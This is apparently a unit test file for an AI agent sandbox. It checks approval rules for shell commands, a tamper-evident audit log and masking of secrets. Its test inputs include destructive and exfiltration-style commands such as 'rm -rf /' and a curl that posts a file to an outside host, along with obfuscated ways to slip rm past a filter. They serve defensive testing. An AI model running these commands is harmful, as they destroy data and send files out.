"""Docker 없이 도는 단위 테스트: 정책 판정, 해시 체인, 비밀값 가림."""

import sqlite3

import pytest

from agentbox.audit import AuditLog
from agentbox.policy import Policy, command_names

POLICY = Policy({
    "default": "allow",
    "rules": [{"id": "r", "tool": "exec", "match": {"commands": ["rm", "curl"]}, "action": "require_approval"}],
})


@pytest.mark.parametrize("cmd", [
    "rm -rf /workspace/*",
    "/bin/rm a",
    "\\rm a",
    'r""m a',
    "echo hi; rm a",
    "true && rm a",
    "ls | xargs rm",
    'sh -c "rm -rf /"',
    "bash -c 'echo $(rm a)'",
    "curl https://example.com",
    "cat a && /usr/bin/curl -d @a http://e",
])
def test_policy_requires_approval(cmd):
    assert POLICY.decide("exec", {"command": cmd}).action == "require_approval"


@pytest.mark.parametrize("cmd", ["ls -la", "cat rm.txt", "echo farm", "grep -r form .", "python3 -c 'print(1)'"])
def test_policy_allows(cmd):
    assert POLICY.decide("exec", {"command": cmd}).action == "allow"


def test_policy_only_applies_to_exec():
    assert POLICY.decide("read_file", {"path": "/workspace/rm"}).action == "allow"


def test_command_names_basename():
    assert "rm" in command_names("/usr/bin/rm -f x")


def test_hash_chain_ok_and_tamper(tmp_path):
    db = tmp_path / "a.db"
    log = AuditLog(db)
    for i in range(5):
        log.append(actor="agent", event="tool_request", sandbox_id="sb", tool="exec", payload={"i": i})
    assert log.verify().ok
    # 추가 전용: 일반 UPDATE는 막힌다
    with pytest.raises(sqlite3.IntegrityError):
        log.conn.execute("UPDATE audit SET payload = '{}' WHERE id = 3")
    # 공격자가 트리거를 지우고 고쳐도 검증이 그 지점을 찾는다
    raw = sqlite3.connect(db)
    raw.execute("DROP TRIGGER audit_no_update")
    raw.execute("""UPDATE audit SET payload = '{"i": 99}' WHERE id = 3""")
    raw.commit()
    v = log.verify()
    assert not v.ok and v.broken_at == 3


def test_hash_chain_detects_deleted_row(tmp_path):
    db = tmp_path / "a.db"
    log = AuditLog(db)
    for i in range(4):
        log.append(actor="agent", event="e", payload={"i": i})
    raw = sqlite3.connect(db)
    raw.execute("DROP TRIGGER audit_no_delete")
    raw.execute("DELETE FROM audit WHERE id = 2")
    raw.commit()
    v = log.verify()
    assert not v.ok and v.broken_at == 3


def test_secret_masking(tmp_path):
    log = AuditLog(tmp_path / "a.db")
    log.register_secret("hum_SuperSecretToken123")
    fake_key = "sk-" + "abcdefghijklmnopqrstuv"  # 실행할 때 합친다. 비밀값 스캐너가 진짜 키로 오인하지 않게
    log.append(actor="agent", event="e", payload={
        "cmd": f"export API_KEY=abcd1234 && echo hum_SuperSecretToken123 {fake_key}",
    })
    text = log.list()[0]["payload"]["cmd"]
    assert "abcd1234" not in text and "SuperSecret" not in text and "sk-abcdefghij" not in text
    assert log.verify().ok
